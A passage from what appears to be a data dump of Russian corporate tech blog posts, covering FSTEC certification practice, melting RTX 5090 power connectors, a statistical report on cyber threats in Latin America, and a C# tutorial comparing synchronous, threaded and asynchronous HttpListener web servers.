проверяем, нет ли каких-то планируемых изменений в требованиях, которые могут повлиять на сертификацию.Сделанные выводы Пожалуй, главный урок, который мы усвоили: сертификация — это не то, к чему нужно готовиться в последний момент. Она должна быть встроена в сам процесс разработки. Поэтому мы организовали полноценный DevSecOps-конвейер и внедрили все необходимые проверки безопасности. Условно говоря, нужно создать такую среду, где небезопасный код просто не может выйти в прод. Каждый коммит проходит через несколько уровней проверки, каждое изменение автоматически документируется, каждая зависимость проверяется на уязвимости.Получилась своего рода «кибериммунная» система — безопасность встроена в процесс на уровне архитектуры. И когда приходит время сертификации, оказывается, что большая часть требований уже выполнена просто потому, что так устроен наш процесс разработки.Очень важно правильно распределить ответственность между командами. У нас это выглядит так:Разработка отвечает за реализацию требований безопасности в коде;Команда ИБ проводит аудиты и консультирует разработку;Security Сhampions обеспечивают коммуникацию между ИБ и разработкой;DevSecOps следит за автоматизацией процессов безопасности;Технические писатели ведут всю документацию.Последнее, но не менее важное: нужно выстроить процесс мониторинга изменений в требованиях регулятора. Это может быть комбинация из нескольких источников: официальные публикации ФСТЭК, информация от испытательной лаборатории, профильные конференции и сообщества. Главное — не пропустить изменения, которые могут непосредственно повлиять на продукт.И, кстати, еще один момент: процесс выстраивания процессов может существенно ускориться, если в команде есть специалист с опытом прохождения сертификации или глубоким пониманием информационной безопасности. Такой человек смотрит на систему под тем же углом, что и регулятор, и может предвидеть потенциальные проблемы еще на этапе проектирования. По сути, это свой «внутренний аудитор», который помогает избежать типичных ошибок.Дополнительную поддержку можно получить в сообществах, сложившихся вокруг Института системного программирования РАН. Команды проводят исследования различного ПО, в первую очередь с открытым исходным кодом, вплоть до ядра Linux. Можно объединить усилия с ними и исследовать свои версии используемых продуктов.В общем, если вы думаете, что сертификация ФСТЭК — это про «надо перетерпеть», то да, но нет. Отношение к сертификации как к единовременному испытанию превратит каждое обновление в новый подвиг, а это вам не понравится. Если же сделать сертификационные требования частью процесса разработки — сертификация превратится просто в один из аспектов работы над продуктом. Правильно выстроенные процессы позволяют работать на опережение. Да, периодически нужно что-то обновлять и корректировать, но это уже не авральная мобилизация всей команды, а планомерная работа. И каждый следующий цикл сертификации проходит быстрее и легче, потому что когда система уже настроена под необходимые требования, любую внезапную «донастройку» можно делать в режиме, близкому к обычному."
36,"Вот этого поворот: NVIDIA рассказала, почему на самом деле горят видеокарты RTX 50",Группа компаний X-Com,X-Com — крупный российский ИТ-холдинг,0,"Программное обеспечение, Аппаратное обеспечение, Консалтинг и поддержка",2025-04-10,"NVIDIA все придумала: виноваты кабели и блоки питанияИстория с плавящимися коннекторами питания, которая преследовала RTX 4090, а теперь благополучно перекочевала и в новое поколение карт, продолжает набирать обороты. Несмотря на громкие заверения NVIDIA о решении всех проблем с печально известным разъемом 12VHPWR, пользователи по всему миру продолжают жаловаться на дым, запах горелой пластмассы и оплавление коннекторов своих видеокарт. Однако компания, как и в прошлый раз, спешит переложить ответственность на кого угодно, только не на себя.Почему горят и плавятся видеокарты RTX 5090NVIDIA выступила с официальным заявлением, в котором указала, что причиной возгораний видеокарт серии RTX 50 являются ""некачественные блоки питания и кабели сторонних производителей"". По версии компании, проблема заключается не в самих картах, а в том, что пользователи якобы используют неподходящие комплектующие или неправильно подключают кабели.Звучит знакомо, не правда ли? Точно такую же позицию компания занимала и два года назад, когда начали гореть RTX 4090. Тогда NVIDIA долгое время отрицала проблему, затем обвинила пользователей в неправильном подключении кабелей, и только потом признала, что дизайн разъема не идеален. Не идеален настолько, что его даже пришлось заменить на другой.Но на этот раз независимые исследования показывают, что ситуация может быть гораздо серьезнее, чем просто ""неправильное подключение"" или ""некачественные кабели"". Известный YouTube-блогер и оверклокер Der8auer (настоящее имя Роман Хартунг) провел собственное расследование, получив на тест поврежденную видеокарту, кабель и блок питания от одного из пострадавших пользователей. Что на самом деле происходит с RTX 5090?Nvidias embarrassing StatementПри тестировании своей собственной RTX 5090 FE под нагрузкой Роман обнаружил, что из шести 12-вольтовых проводов один почему-то нагружается гораздо сильнее остальных. Вместо нормальных 6-8 ампер через него проходило более 22! Это приводило к тому, что температура в месте соединения с блоком питания достигала 150 градусов Цельсия всего через четыре минуты работы под нагрузкой.Представляете? Пластик большинства коннекторов начинает плавиться при температуре около 120-130 градусов. А при 150 градусах деформация и вовсе неизбежна. Это нарушает контакт и создает еще большее сопротивление, а значит — еще больший нагрев. Получается замкнутый круг, который в итоге приводит к оплавлению разъема, короткому замыканию и потенциальному повреждению дорогостоящих компонентов.Причем проблема, похоже, затрагивает не только кастомные кабели сторонних производителей (на которые NVIDIA пытается списать все проблемы), но и оригинальные. Ютубер Toro Tocho сообщил о похожем случае с оригинальным кабелем, где также оплавились оба конца коннектора.Проблемы разъема 12VHPWRКазалось бы, к выходу RTX 50 все должно было измениться. Компания заявила, что новый улучшенный разъем 12V-2×6 полностью решает проблему. Его ключевые отличия — более короткие контактные пины для лучшего соединения и удлиненные токопроводящие терминалы для стабильной подачи питания.Однако реальность оказалась иной. Первый случай возгорания был зафиксирован в начале февраля, когда пользователь Reddit сообщил о запахе гари во время игры в Battlefield 5. Выключив компьютер, он обнаружил, что коннектор его новенькой RTX 5090 Founders Edition оплавлен. Причем пострадал не только разъем на видеокарте, но и кабель, и даже сам блок питания.С тех пор количество сообщений о подобных проблемах только растет. Причем многие пострадавшие утверждают, что использовали оригинальные кабели и правильно их подключали. Это ставит под сомнение версию NVIDIA о том, что во всем виноваты ""некачественные кабели"".Даже качественные кабели нужно уметь правильно подключатьБывший инженер Intel и Gigabyte, специализирующийся на электрике, прокомментировал ситуацию так: ""Сам коннектор не плохой. Он просто рассчитан на слишком высокую мощность, что оставляет мало запаса прочности и, следовательно, мало места для ошибки или несовершенства. 600 Вт следует рассматривать как абсолютный максимум мощности, а около 375 Вт — как приемлемый предел номинальной мощности"".По его мнению, следует избегать любых карт, потребляющих более 375 Вт через один коннектор 12VHPWR. А RTX 5090, напомню, потребляет до 575 Вт энергии — это на 125 Вт больше, чем у предшественницы RTX 4090. Такой скачок энергопотребления создает дополнительную нагрузку на и без того проблемный разъем питания.Фактически все дело в том, что разъем 12VHPWR слишком сильно нагружается, а с точки зрения безопасности это недопустимо. К тому же, в последние годы NVIDIA последовательно удаляла средства защиты, такие как шунтирующие резисторы, от поколения к поколению своих карт, что также способствовало увеличению риска возгорания и других связанных с этим негативных последствий.Что делать владельцам RTX 5090, чтобы видеокарты не начали горетьГлавное правило – не перегибать кабельПока NVIDIA продолжает отрицать наличие системной проблемы с дизайном своих карт, владельцам RTX 5090 стоит принять несколько мер предосторожности:Не использовать свои старые кабели 12VHPWR, изготовленные до 2025 года, с новейшими видеокартами NVIDIA серии RTX 50. Только решения 2025 года прошли проверку на совместимость с серией RTX 50.Обеспечьте хорошую вентиляцию корпуса, особенно в районе видеокарты и блока питания. Дополнительное охлаждение поможет снизить температуру компонентов и уменьшить риск перегрева.Подбирайте блоки питания для компьютера в соответствии с калькулятором БП от XCOM-SHOP.RU. Он максимально точно рассчитает энергопотребление вашего ПК и не даст вам ошибиться с выбором.Можно немного снизить энергопотребление карты. Используйте MSI Afterburner и уменьшите Power Limit до 90% от максимума. Это создаст небольшой запас по питанию и может уберечь от перегрузок, при этом производительность снизится не так значительно — вы потеряете всего 3-5%.Следите за состоянием карты. Установите GPU-Z или HWiNFO64 — они покажут подробную информацию о температуре и энергопотреблении в реальном времени. Особенно внимательно следите за температурой памяти и общим энергопотреблением карты.Остается надеяться, что NVIDIA все-таки признает проблему и предложит реальное решение, а не будет продолжать перекладывать ответственность на пользователей и производителей кабелей. В конце концов, когда ты платишь за флагманскую видеокарту такие деньги, ожидаешь, что она будет не только мощной, но и безопасной."
37,Цифровизация и киберугрозы в Латинской Америке: как технологии привлекают хакеров,Positive Technologies,Лидер результативной кибербезопасности,0,"Веб-разработка, Программное обеспечение, Информационная безопасность",2025-04-10,"Источник фото: SecurityLab.ruЛатинская Америка и Карибский бассейн переживают настоящую цифровую революцию, но вместе с новыми возможностями приходят и серьёзные киберугрозы. Ситуация с уровнем цифровизации в странах Латинской Америки и на Карибах сложилась по-разному — в то время как в одних государствах активно внедряют технологии (у людей есть нормальный интернет, работают государственные сервисы онлайн, принимаются законы, поддерживающие цифровое развитие), другие заметно отстают. И те, и другие, по-разному, но создают идеальные условия для киберпреступников.  В новом исследовании мы проанализировали состояние киберзащищенности 23 стран Латинской Америки и Карибского бассейна в 2023-2024 гг. В процессе исследования были изучены 350 телеграм-каналов и форумов в дарквебе, общее количество проанализированных сообщений составило 192 млн (и было написано 43 млн пользователями). В данной статье отметим актуальные киберугрозы в регионе и основные тенденции развития там рынка кибербезопасности.Цифровизация меняет жизнь: появляются онлайн-магазины, госуслуги переходят в интернет, заводы автоматизируются. Например, в 14 странах региона уже запустили или разрабатывают системы электронного правительства (e-government). А с онлайн-шопингом (e-commerce) дела идут ещё лучше — эксперты прогнозируют, что к 2027 году рынок вырастет: в Бразилии — на 58%, в Мексике — на 52%, а в Аргентине — аж на 90%!   Пока лидерами по объёмам рынка электронной коммерции являются Бразилия (29% рынка) и Мексика (26%). Цифровизация = магнит для хакеров?Чем круче страна в плане цифровизации, тем чаще её атакуют киберпреступники. В топ-5 самых привлекательных для хакеров стран региона попали по порядку Бразилия, Мексика, Колумбия, Чили и Аргентина. Давайте разберёмся, почему их так любят взламывать и куда именно бьют чаще всего.    🇧🇷 Бразилия — это цифровой локомотив региона: 12 000 стартапов, 36,5% всего IT-рынка Латинской Америки и $4 млрд вложений в ИИ. Плюс мощные e-commerce (13% ВВП) и промышленность — от автомобилей до стали.    Здесь хакеры нацелены на следующие отрасли: ✅ Госсектор (26% атак приходится на него) — чиновники любят хранить секреты в уязвимых системах.  ✅ Банки и ритейл (по 8%) — где деньги, там и хакеры.   ✅ IT-компании (6%)— источник баз данных как способ заняться шантажом и вымогательством.🇲🇽 Мексика — вторая экономика региона, но первая по количеству финтех-стартапов (773 штуки!). Здесь бешено растёт онлайн-торговля, а ещё страна кормит пол-Америки (3-е место по пищепрому).    Главные цели хакеров в Мексике: 💸 Банки (19%) — куда же без них?🏭 Промышленность (12%) 🛒 Онлайн-магазины (10 %) — карты клиентов = золотая жила.   На госструктуры здесь приходится всего 6% атак — видимо, после прошлых скандалов защиту подтянули. Колумбию, Чили и Аргентину киберпреступники тоже не жалеют — помимо основных, там бьют по науке, медицине и финтеху.А вывод из всего этого простой: чем больше цифры, тем чаще хакеры стучатся в дверь. Защита нужна везде! 🔐 Кибербезопасность в Латинской Америке 2024Бразилия и Уругвай лидируют в регионе по защите от кибератак, тогда как Гренада и Антигуа с Барбуда отстают. В 2024 году Эквадор и Панама вошли в число стран с защитой выше среднего мирового уровня.    Ключевые факторы защиты: законы (Бразилия приняла стратегии E-Ciber и PNCiber), обучение (Эквадор привлек 170 экспертов для разработки национальной стратегии кибербезопасности) и экономика. Бразилия и Мексика, имея 36% и 18% региональных CERT-центров соответственно, инвестируют больше в киберзащиту благодаря высокому ВВП.    Международное сотрудничество усиливает безопасность: LAC4 проводит обучающие мероприятия, а число участников FIRST из региона выросло на 26% за год. Технологически развитый Чили, однако, уступает по инвестициям из-за более низкого ВВП.Главный вывод: уровень киберзащиты напрямую зависит от экономических возможностей и системного подхода стран.Соотношение индекса кибербезопасности и ВВП страны Источники данных: Global Cybersecurity Index 2024; International Monetary FundКому достается больше всего хакерских атак в Латинской Америке и на Карибах?Распределение успешных кибератак на организации по странам регионаВ 2024 году хакеры чаще всего нападали на компании в Бразилии (19% всех атак) и Мексике (16%). Больше всего страдают госучреждения (21%) – после выборов в Венесуэле хакеры из Anonymous разом взломали 45 правительственных сайтов. Хотя атак на госструктуры стало на 10% меньше, зато банки становились мишенью на 4% чаще – в мае 2024 года хакеры пытались взломать Центробанк Бразилии.  Категории жертв среди организаций регионаНе отстают и онлайн-магазины (9% атак) – летом 2023-го мошенники воровали данные карт покупателей с сайтов в Бразилии и Перу. А промышленные предприятия атакуют практически регулярно.В феврале 2024-го группа LockBit 3.0 взломала чилийский завод, который делает детали для горной промышленности.  Как именно работают хакеры? В 76% случаев ломают компьютеры и серверы, в 52% – обманывают сотрудников через поддельные письма. Каждая пятая атака (18%) идёт через сайты компаний – это на 3% больше, чем год назад.    Обычные люди тоже в зоне риска – на них приходится 22% атак (на 4% больше среднего в мире). В Аргентине (35%), Бразилии (33%) и Мексике (22%) пользователей чаще всего обманывают через фейковые письма (82% случаев) – например, в Колумбии рассылали поддельные штрафы за нарушение ПДД с вирусами. Каждая четвёртая атака (26%) идёт через смартфоны – в Перу троян Zanubis маскировался под приложение госуслуг.Пример фишингового письма с уведомлением о нарушении правил дорожного движения Источник: ANY.RUNКороче говоря, хакеры не дремлют – идут туда, где деньги и данные. А обычные пользователи часто становятся слабым звеном, через которое взламывают компании. Так что будьте начеку!Как хакеры атакуют Латинскую Америку?Хакеры в регионе работают по проверенным схемам: в 57% атак на компании и 96% на обычных пользователей они используют обман (социальную инженерию), а в 67% и 79% случаев соответственно – вредоносные программы. Часто эти методы сочетают: так сделали в 48% атак на бизнес и 71% – на людей.Летом 2024 в Мексике распространяли вирус Gigabud через фейковые сайты, похожие на Google Play и банковские страницы.  Каждая четвертая успешная атака (28%) использует дыры в защите.   В мае 2024 появился ботнет CatDDoS, который через 80 известных уязвимостей в маршрутизаторах и сетевом оборудовании атаковал в основном Бразилию, США и Европу.    Половина успешных атак на компании (49%) – это шифровальщики вроде BlackCat или LockBit 3.0. Простых пользователей чаще обманывают шпионскими программами (39%) и банковскими троянами (35%). В октябре 2024 в Бразилии появился новый троян Silver Oryx Blade, который воровал данные из 50 банков.  Госучреждения – главная цель вымогателей (25% атак).   В июле 2023 в бразильском городе Жакарезинью хакеры зашифровали базы данных мэрии, парализовав выдачу документов и начисление зарплат на две недели.  Хотя целенаправленные атаки APT-групп в регионе редки (всего 6%), они опаснее обычных. Группировка TA558 в апреле 2024 атаковала промышленные предприятия и госучреждения в Мексике, Бразилии и других странах. Blind Eagle рассылала фейковые письма от налоговой Колумбии со вирусом Quasar RAT. А APT15 использует десятки инструментов для атак на министерства иностранных дел.    Самые хитрые – группа Astaroth. В октябре 2024 они притворялись налоговой службой Бразилии и атаковали промышленные компании и госструктуры.  Хакеры в регионе не изобретают велосипед, но эффективно используют проверенные методы – от простого мошенничества до сложных целевых атак. И с каждым годом их инструменты становятся изощреннее.Пример фишингового письма, нацеленного на загрузку ВПО Astaroth для кражи данных Источник: Trend MicroЧем опасны хакерские атаки?После успешного взлома компании чаще всего сталкиваются с утечкой данных (53% случаев) и сбоями в работе (35%). Для обычных пользователей утечка данных – ещё более актуальная проблема (72% случаев). Каждая пятая атака (19%) приводит к прямым денежным потерям.    Утечка информации бьет по репутации компаний и может отпугнуть клиентов. Для госучреждений последствия могут быть ещё серьёзнее – в мае 2023 года хакеры выложили 360 000 секретных документов чилийской армии, что составило лишь треть украденного. Чаще всего воруют учётные данные (32%), личную информацию (21%) и данные карт (23% у физлиц).В октябре 2024 хакеры украли данные 3 млн клиентов перуанского банка Interbank – включая номера карт и CVV-коды (всего 3,7 ТБ информации).    Проще говоря, последствия атак – это не только деньги, но и подорванное доверие, а иногда и угроза национальной безопасности. Последствия успешных кибератакАнализ теневых площадок  Мы проанализировали 2458 объявлений, опубликованных на различных теневых форумах и в телеграм-каналах в 2023–2024 годах и упоминавших страны Латинской Америки и Карибского бассейна.Почти каждое пятое объявление (16%) касается государственного сектора. Как правило, в этих случаях злоумышленники не стремятся получить финансовую выгоду: значительная часть сообщений направлена на раздачу данных (59%). Например, за такими объявлениями могут стоять хактивисты, привлекающие внимание общественности к своим взглядам, или киберпреступники, которые хотят повысить свою репутацию на теневом рынке для продвижения товаров и услуг.Чаще всего в дарквебе встречаются объявления, связанные с государственными секторами Аргентины (22%), Бразилии (18%), Мексики (15%), Колумбии (10%) и Эквадора (8%).Заявление о реализованной кибератаке на правительственный сайт аргентинского города Капитан-СармьентоНаиболее популярные темы на теневых площадках — это базы данных (47% сообщений) и доступы (26% сообщений). Четвертая часть публикаций представляет собой заявления о заражении систем жертв шифровальщиками (20%) или взломе (4%). Другие объявления содержали новости о реализованных DDoS-атаках и призывы к участию в киберпреступных кампаниях, а также сообщения о покупке платежных данных карт и подробную информацию о найденных уязвимостях.Половина объявлений в дарквебе связана с базами данных (47%), при этом только в 21% из них базы продаются, а в 74% раздаются бесплатно. Как правило, за подобными публикациями стоят хактивисты, действующие в соответствии со своими политическими взглядами, а также это могут быть киберпреступники, которые, например, так и не смогли добиться выкупа от жертвы. Основные категорий жертв среди организаций, встречающихся в сообщениях на теневом рынкеНа втором месте после баз данных в дарквебе ценятся доступы: 65% стоят от $100 до $1000, 31% — дороже $1000. Дешевые доступы обычно к ритейл-компаниям. Чаще всего предлагают RDP/VPN (33%), реже — Citrix, RDWeb (13%) или Shell (10%).  Объявление о продаже доступа в компании сферы розничной торговлиЧто касается операторов шифровальщиков, 98% объявлений от них — банальное хвастовство успешными атаками. 23% связаны с группировкой LockBit 3.0 (например, атака на мексиканскую Oleopalma).  Вывод: в дарквебе преобладают утечки данных и доступов, часто бесплатные. Основные цели — госучреждения и бизнес, особенно в Латинской Америке.Заключение В Латинской Америке активная цифровизация сопровождается ростом киберугроз, особенно в Бразилии и Мексике, где чаще всего атакуют госучреждения через социальную инженерию, утечки данных и шифровальщики. Для защиты необходимо укреплять законодательство в сфере кибербезопасности, развивать CERT-центры, защищать критическую инфраструктуру современными инструментами, наращивать международное сотрудничество и повышать осведомлённость пользователей, как это делают, например, Бразилия и Мексика, где кибербезопасностью озабочены на уровне государства. Более подробно с информацией, представленной в статье, можно ознакомиться в полной версии исследования. "
38,Микросервисы на C#. Часть 2,Холдинг Т1,Многопрофильный ИТ-холдинг,0,"Программное обеспечение, Аппаратное обеспечение, Связь и телекоммуникации",2025-04-10,"Сейчас, когда мы более-менее представляем, что такое микросервисы, самое время переходить к конкретике. Мы в курсе, что нам предстоит разрабатывать веб-приложения, так что надо узнать, какие средства для этого предлагает .NET.Первая часть.Исторический экскурсВеб-приложения, то есть динамические сайты, в .NET можно было разрабатывать с самой первой версии, с 2003 года. Тогда Microsoft предложила немного странную парадигму, которую сейчас принято называть WebForms. Она была понятна десктопным разработчикам, но веб-разработчикам приходилось с ней разбираться. Там были такие штуки, как события и цикл жизни страниц. Сейчас подход WebForms признали устаревшим и не планируют далее поддерживать.В 2006-м в .NET появилась библиотечно-инструментальная поддержка SOAP под названием WCF — Windows Communication Foundation.В наше время «правильной» заменой SOAP считается gRPC, так что Microsoft в .NET Core отказалась и от поддержки WCF. Впрочем, они запустили проект с открытым исходным кодом, который позволит перевести написанные приложения на новую платформу.В 2005 году Дэвид Ханссон опубликовал исходный код фреймворка Ruby on Rails, где предлагал простую и удобную концепцию разработки. Он взял за основу старый добрый паттерн Model-View-Controller (MVC), добавил толику здравого смысла и прикрутил всё это к HTTP. Фреймворк вышел удачным. Команда разработчиков ASP.NET вовремя разглядела его потенциал и разработала похожее решение на C#.Конечно, сама концепция MVC не нова, впервые о ней заговорили ещё в 1978-м. Но такие вещи, как маршрутизация запросов и хелперы — прямое заимствование из RoR.ASP.NET MVC вышел в 2009-м и включал в себя Web API. Это была та же парадигма MVC, заточенная под разработку REST-сервисов. Для развёртывания приложений всё ещё требовался IIS, и если вы его настраивали, то знаете, что это непросто. IIS большой.В 2013-м Microsoft разработала встраиваемый веб-сервер Katana, который позволил писать self-hosted web applications — автономные веб-приложения. Чтобы одно и то же приложение можно было запускать и автономно, и в IIS, Microsoft спроектировала общий интерфейс веб-серверов OWIN.Наконец, в 2016-м появился .NET Core — переносимая инкарнация .NET Framework. Разработчикам .NET Core пришлось практически полностью переписать стандартную библиотеку, не рассчитывая больше на Windows API. Переработка затянулась на несколько лет и, фактически, всё ещё продолжается. ASP.NET Core вместе с Web API перенесли одним из первых, им можно пользоваться с 2016-го. От Katana пришлось отказаться в пользу нового переносимого асинхронного веб-сервера Kestrel. Для реализации асинхронности разработчики Kestrel использовали кросс-платформенную библиотеку libuv с открытым кодом, но сегодня все необходимые функции есть уже в .NET Core.ПримерПосмотрим, как выглядит типичный современный веб-проект. Представим, что у нас есть приложение, которое помогает вести список дел, to do list.В соответствии с подходом REST каждое дело (to do item) представляет собой ресурс. Доступ к ресурсам осуществляется через базовый URI, у нас это будет api/v1/todo-items. Чтобы получить ресурс с идентификатором 100, надо послать GET-запрос по адресу api/v1/todo-items/100.[Route(""api/v1/todo-items"")] public class TodoItemsController : ControllerBase {     private readonly TodoDbContext dbContext;      [HttpGet(“{id}”)]     public async Task<TodoItem> GetByIdAsync(int id)     {         return await dbContext.TodoItems                               .SingleAsync(x => x.Id == id);     } }Так выглядит обработчик запроса в .NET Core. Мы видим атрибуты Route и HttpGet, которые помогают фреймворку понять, что запрос GET api/v1/todo-items/100 соответствует методу GetByIdAsync, а число 100 — параметру id.Код работает асинхронно, но благодаря магии компилятора C# выглядит синхронным. Возвращаемый объект класса TodoItem будет преобразован в JSON или XML, в зависимости от предпочтений клиента.В целом, код не кажется сложным, особенно, если у вас есть опыт чтения исходников на C, C++ или Java.Пара слов об асинхронностиНе все программисты понимают, зачем нужна асинхронность в веб-приложениях. Об этом стоит поговорить. Сравним производительность трёх версий веб-сервера: обычного, параллельного и асинхронного.Обычный веб-серверОбычным мы будем называть не-параллельный и не-асинхронный веб-сервер.Наш веб-сервер возвращает простой HTML-документ, если мы посылаем ему запрос GET /. Я убрал из примера весь лишний код, в частности, обработку ошибок.var listener = new HttpListener(); listener.Prefixes.Add(""http://localhost:8080/""); listener.Start();  while (true) {     var context = listener.GetContext();     if (context.Request.HttpMethod == ""GET"" && context.Request.RawUrl == ""/"")     { //        Thread.Sleep(100);         context.Response.StatusCode = 200;          using (var writer = new StreamWriter(context.Response.OutputStream))         {             writer.WriteLine(""<!DOCTYPE html>"");             writer.WriteLine(""<html lang='en' xmlns='http://www.w3.org/1999/xhtml'>"");             writer.WriteLine(""  <head>"");             writer.WriteLine(""  <meta charset='utf-8' />"");             writer.WriteLine(""  <title>Example HTTP server</title>"");             writer.WriteLine(""  </head>"");             writer.WriteLine(""  <body>"");             writer.WriteLine(""    <p>Example HTTP server</p>"");             writer.WriteLine(""  </body>"");             writer.WriteLine(""</html>"");         }     }     else         context.Response.StatusCode = 404;      context.Response.OutputStream.Close(); }Этот веб-сервер работает последовательно и синхронно.Вызов GetContext() «замораживает» выполнение программы, пока на вход не поступит запрос для обработки. Обработка означает проверку параметров, отправку HTML-кода клиенту и установку корректного статуса.Несмотря на синхронность, или, возможно, благодаря ей, сервер работает очень быстро. Он в состоянии обрабатывать до пятисот запросов в секунду на обычном офисном компьютере.Проблемы возникают, если мы имитируем какую-то «продолжительную обработку» на стороне сервера, например, обращение к базе данных.Раскомментируем вызов Thread.Sleep(100), чтобы сервер ждал 0,1 секунды, прежде чем ответить на запрос. Теперь сервер можно обрабатывать порядка пятидесяти запросов в секунду, то есть в десять раз меньше, чем без «нагрузки».У нашего сервера есть ещё одна проблема. Он нагружает только один процессор в системе, даже если их несколько. Попытаемся исправить ситуацию — разработаем параллельную версию программы.Параллельный веб-серверvar listener = new HttpListener(); listener.Prefixes.Add(""http://localhost:8080/""); listener.Start();  while (true) {     var context = listener.GetContext();      var thread = new Thread(ProcessRequest);     thread.Start(context); }  . . .  void ProcessRequest(object parameter) {     var context = (HttpListenerContext) parameter;     if (context.Request.HttpMethod == ""GET"" && context.Request.RawUrl == ""/"")     { //        Thread.Sleep(100);         context.Response.StatusCode = 200;          using (var writer = new StreamWriter(context.Response.OutputStream))         {             writer.WriteLine(""<!DOCTYPE html>"");             writer.WriteLine(""<html lang='en' xmlns='http://www.w3.org/1999/xhtml'>"");             writer.WriteLine(""  <head>"");             writer.WriteLine(""  <meta charset='utf-8' />"");             writer.WriteLine(""  <title>Example HTTP server</title>"");             writer.WriteLine(""  </head>"");             writer.WriteLine(""  <body>"");             writer.WriteLine(""    <p>Example HTTP server</p>"");             writer.WriteLine(""  </body>"");             writer.WriteLine(""</html>"");         }     }     else         context.Response.StatusCode = 404;      context.Response.OutputStream.Close(); }Исходный код программы остался практически неизменным. Нам пришлось вынести код обработки запроса в отдельный метод, потому что «параллельное выполнение» в .NET означает запуск метода в новом потоке (thread). Веб-сервер, получив запрос, создаёт поток для его обработки, а сам возвращается в режим ожидания — вызов GetContext(), как мы помним, «замораживает» главный поток.Новая версия программы будет равномерно загружать все наши процессоры. Но, поскольку запуск потока — ресурсоёмкая операция, сервер окажется чуть медленнее, чем простая последовательная версия. Вместо пятисот запросов в секунду он сможет обрабатывать триста.Однако, он гораздо лучше справляется с «нагрузкой». Вернув в программу паузу в 0,1 секунды, мы увидим, что производительность сервера осталась на прежнем уровне — триста запросов.Удивительно, но создаваемые нами потоки простаивают большую часть времени. Они отправляют клиенту HTML-код и большую часть времени ожидают, когда все данные будут переданы по сети.Нам не обязательно создавать так много потоков (один на каждый запрос), чтобы успевать обрабатывать всё.Создадим асинхронную версию веб-сервера и проверим её производительность.Асинхронный веб-серверvar listener = new HttpListener(); listener.Prefixes.Add(""http://localhost:8080/""); listener.Start();  listener.BeginGetContext(AsyncProcessRequest, listener); Console.ReadKey(); listener.Stop();  . . .  void AsyncProcessRequest(IAsyncResult ar) {     var listener = (HttpListener)ar.AsyncState;     listener.BeginGetContext(AsyncProcessRequest, listener);      var context = listener.EndGetContext(ar);     if (context.Request.HttpMethod == ""GET"" && context.Request.RawUrl == ""/"")     {         context.Response.StatusCode = 200; //        Thread.Sleep(100);         using (var memoryStream = new MemoryStream())         using (var writer = new StreamWriter(memoryStream, leaveOpen: true))         {             writer.WriteLine(""<!DOCTYPE html>"");             writer.WriteLine(""<html lang='en' xmlns='http://www.w3.org/1999/xhtml'>"");             writer.WriteLine(""  <head>"");             writer.WriteLine(""  <meta charset='utf-8' />"");             writer.WriteLine(""  <title>Example HTTP server</title>"");             writer.WriteLine(""  </head>"");             writer.WriteLine(""  <body>"");             writer.WriteLine(""    <p>Example HTTP server</p>"");             writer.WriteLine(""  </body>"");             writer.WriteLine(""</html>"");              var buffer = memoryStream.ToArray();             context.Response.OutputStream.BeginWrite(buffer, 0, buffer.Length,                 AsyncWriteResponse, context.Response.OutputStream);         }     }     else     {         context.Response.StatusCode = 404;         context.Response.OutputStream.Close();     } }  void AsyncWriteResponse(IAsyncResult ar) {     var outputStream = (Stream)ar.AsyncState;     outputStream.EndWrite(ar);     outputStream.Close(); }Первое, на что мы обращаем внимание — на возросшую сложность программы. Асинхронный код никогда не считался простым, поскольку мы не можем держать всю логику обработки в одном или двух методах.Мы вынуждены разбить программу на методы обратного вызова (callback methods) и аккуратно передавать состояние между ними.В начале мы вызываем метод BeginGetContext(). Сразу после этого мы вынуждены вызывать Console.ReadKey(), чтобы приостановить программу, пока пользователь не нажмёт какую-нибудь клавишу. Раньше у нас подобной проблемы не возникало, потому что код работал в бесконечном синхронном цикле.BeginGetContext() возвращает управление сразу, это основа асинхронного кода. Выполнение будет продолжено, как только на вход сервера поступит HTTP-запрос.В этот момент будет вызван метод AsyncProcessRequest. Первое, что мы должны сделать, — организовать подобие бесконечного цикла. Мы снова вызываем BeginGetContext(), чтобы перевести сервер в режим ожидания запроса. И снова управление вернётся в наш метод, чтобы мы могли завершить обработку.Вызов EndGetContext() уведомит объект-сервер, что с нашим запросом всё в порядке. Для передачи HTML нам приходится создать буфер, чтобы собрать там данные для отправки. Отправку мы тоже сделаем асинхронной с помощью пары методов BeginWrite() и EndWrite().Этот код и правда громоздкий. Но что мы получили взамен? Большую скорость. Наша программа спокойно обрабатывает тысячу запросов в секунду. Если мы раскомментируем строку Thread.Sleep(100), то количество запросов немного снизится — где-то до девятисот пятидесяти.На самом деле, производительность нашей программы осталась на прежнем уровне. Проблема возникла потому, что мы приостанавливаем поток выполнения, чего не следует делать в асинхронной программе.Корректный код в нашем случае получится ещё более громоздким, поэтому я не буду тратить на него время. Вместо этого покажу, как просто выглядит асинхронный код в современном C#.Современный асинхронный веб-серверvar listener = new HttpListener(); listener.Prefixes.Add(""http://localhost:8080/""); listener.Start();  GetContextAsync(listener).Wait();  Console.ReadKey(); listener.Stop();  . . .  async Task GetContextAsync(HttpListener listener) {     await Task.Yield();       var context = await listener.GetContextAsync();      await GetContextAsync(listener);      if (context.Request.HttpMethod == ""GET"" && context.Request.RawUrl == ""/"")     { //        await Task.Delay(100);         context.Response.StatusCode = 200;          using (var writer = new StreamWriter(context.Response.OutputStream))         {             await writer.WriteLineAsync(""<!DOCTYPE html>"");             await writer.WriteLineAsync(""<html lang='en' xmlns='http://www.w3.org/1999/   xhtml'>"");             await writer.WriteLineAsync(""  <head>"");             await writer.WriteLineAsync(""  <meta charset='utf-8' />"");             await writer.WriteLineAsync(""  <title>Example HTTP server</title>"");             await writer.WriteLineAsync(""  </head>"");             await writer.WriteLineAsync(""  <body>"");             await writer.WriteLineAsync(""    <p>Example HTTP server</p>"");             await writer.WriteLineAsync(""  </body>"");             await writer.WriteLineAsync(""</html>"");         }          context.Response.OutputStream.Close();     }     else     {         context.Response.StatusCode = 404;         context.Response.OutputStream.Close();     } }Эта версия программы похожа на нашу первую версию, последовательную и синхронную. Но, благодаря магии компилятора, на самом деле она работает асинхронно.Компилируя метод, помеченный ключевым словом async, компилятор разбивает его на части там, где встречает асинхронные вызовы, помеченные ключевым словом await.Эти части становятся «как бы» самостоятельными методами обратного вызова. И компилятор обеспечивает передачу значений между ними.В результате условный кодA(); var context = await listener.GetContextAsync(); B(listener);превращается во что-то похожее наA(); listener.BeginGetContext(B, listener);Конечно, всё намного сложнее, чем я описал. Компилятор умеет работать не только с последовательным кодом, но и с циклами, и с ветвлениями. Он учитывает поток управления, чтобы асинхронный код работал так же, как синхронный.Если вам интересны детали этой магии, 